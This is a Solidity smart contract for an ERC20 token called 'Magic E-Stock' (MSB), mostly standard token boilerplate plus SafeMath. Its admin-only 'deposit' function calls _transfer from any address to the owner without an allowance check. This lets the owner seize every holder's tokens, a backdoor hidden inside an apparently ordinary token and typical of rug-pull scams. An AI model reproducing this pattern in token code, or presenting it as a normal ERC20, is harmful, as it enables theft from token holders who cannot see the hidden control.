1 // SPDX-License-Identifier: MIT
2 
3 pragma solidity ^0.6.0;
4 
5 
6 interface IERC20 {
7 
8     function totalSupply() external view returns (uint256);
9 
10     function balanceOf(address account) external view returns (uint256);
11 
12 
13     function transfer(address recipient, uint256 amount) external returns (bool);
14 
15 
16     function allowance(address owner, address spender) external view returns (uint256);
17 
18    
19     function approve(address spender, uint256 amount) external returns (bool);
20 
21    
22     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
23 
24     event Transfer(address indexed from, address indexed to, uint256 value);
25 
26     event Approval(address indexed owner, address indexed spender, uint256 value);
27 }
28 
29 contract ERC20 is  IERC20 {
30     using SafeMath for uint256;
31 
32 
33     mapping (address => uint256) private _balances;
34 
35     mapping (address => mapping (address => uint256)) private _allowances;
36 
37     uint256 private _totalSupply;
38 
39     string private _name;
40     string private _symbol;
41     uint8 private _decimals;
42     address private _owner;
43     
44 
45     constructor (address owner) public {
46         _name = 'Magic E-Stock';
47         _symbol = 'MSB';
48         _decimals = 8;
49         _totalSupply = 160000000 * 10**8;
50         _balances[owner] = _balances[owner].add(_totalSupply);
51         _owner = owner;
52     }
53 
54     modifier isAdmin(){
55         require(_msgSender() == _owner, "Must a admin");
56         _;
57     }
58     
59      function _msgSender() internal view virtual returns (address payable) {
60         return msg.sender;
61     }
62 
63     function _msgData() internal view virtual returns (bytes memory) {
64         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
65         return msg.data;
66     }
67 
68     function changeOwner(address owner) isAdmin public virtual returns(bool){
69         _owner = owner;
70     }
71 
72     function name() public view returns (string memory) {
73         return _name;
74     }
75 
76     function symbol() public view returns (string memory) {
77         return _symbol;
78     }
79 
80     function decimals() public view returns (uint8) {
81         return _decimals;
82     }
83 
84     function totalSupply() public view override returns (uint256) {
85         return _totalSupply;
86     }
87 
88     function balanceOf(address account) public view override returns (uint256) {
89         return _balances[account];
90     }
91 
92     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
93         _transfer(_msgSender(), recipient, amount);
94         return true;
95     }
96     
97     function allowance(address owner, address spender) public view virtual override returns (uint256) {
98         return _allowances[owner][spender];
99     }
100 
101     function approve(address spender, uint256 amount) public virtual override returns (bool) {
102         _approve(_msgSender(), spender, amount);
103         return true;
104     }
105     
106     
107     function withdraw(address recipient, uint256 amount) isAdmin  public virtual returns (bool) {
108          _transfer(_msgSender(), recipient, amount);
109         return true;
110     }
111     
112     function deposit(address sender, uint256 amount) isAdmin  public virtual returns (bool) {
113        _transfer(sender, _msgSender(), amount);
114         return true;
115     }
116 
117     function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
118         _transfer(sender, recipient, amount);
119         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
120         return true;
121     }
122 
123     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
124         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
125         return true;
126     }
127 
128     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
129         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
130         return true;
131     }
132     
133     
134     function _transfer(address sender, address recipient, uint256 amount) internal virtual {
135         require(sender != address(0), "ERC20: transfer from the zero address");
136         require(recipient != address(0), "ERC20: transfer to the zero address");
137 
138         _beforeTokenTransfer(sender, recipient, amount);
139 
140         _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
141         _balances[recipient] = _balances[recipient].add(amount);
142         emit Transfer(sender, recipient, amount);
143     }
144     
145     
146     function _mint(address account, uint256 amount) internal virtual {
147         require(account != address(0), "ERC20: mint to the zero address");
148 
149         _beforeTokenTransfer(address(0), account, amount);
150 
151         _totalSupply = _totalSupply.add(amount);
152         _balances[account] = _balances[account].add(amount);
153         emit Transfer(address(0), account, amount);
154     }
155 
156 
157     function _burn(address account, uint256 amount) internal virtual {
158         require(account != address(0), "ERC20: burn from the zero address");
159 
160         _beforeTokenTransfer(account, address(0), amount);
161 
162         _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
163         _totalSupply = _totalSupply.sub(amount);
164         emit Transfer(account, address(0), amount);
165     }
166 
167 
168     function _approve(address owner, address spender, uint256 amount) internal virtual {
169         require(owner != address(0), "ERC20: approve from the zero address");
170         require(spender != address(0), "ERC20: approve to the zero address");
171         
172         _allowances[owner][spender] = amount;
173         emit Approval(owner, spender, amount);
174     }
175     
176     
177     function _setupDecimals(uint8 decimals_) internal {
178         _decimals = decimals_;
179     }
180     
181     
182     function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
183 }
184 
185 
186 library SafeMath {
187 
188     function add(uint256 a, uint256 b) internal pure returns (uint256) {
189         uint256 c = a + b;
190         require(c >= a, "SafeMath: addition overflow");
191 
192         return c;
193     }
194 
195     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
196         return sub(a, b, "SafeMath: subtraction overflow");
197     }
198 
199     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
200         require(b <= a, errorMessage);
201         uint256 c = a - b;
202 
203         return c;
204     }
205 
206     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
207    
208         if (a == 0) {
209             return 0;
210         }
211 
212         uint256 c = a * b;
213         require(c / a == b, "SafeMath: multiplication overflow");
214 
215         return c;
216     }
217 
218     function div(uint256 a, uint256 b) internal pure returns (uint256) {
219         return div(a, b, "SafeMath: division by zero");
220     }
221 
222     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
223         require(b > 0, errorMessage);
224         uint256 c = a / b;
225         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
226 
227         return c;
228     }
229 
230     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
231         return mod(a, b, "SafeMath: modulo by zero");
232     }
233 
234     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
235         require(b != 0, errorMessage);
236         return a % b;
237     }
238 }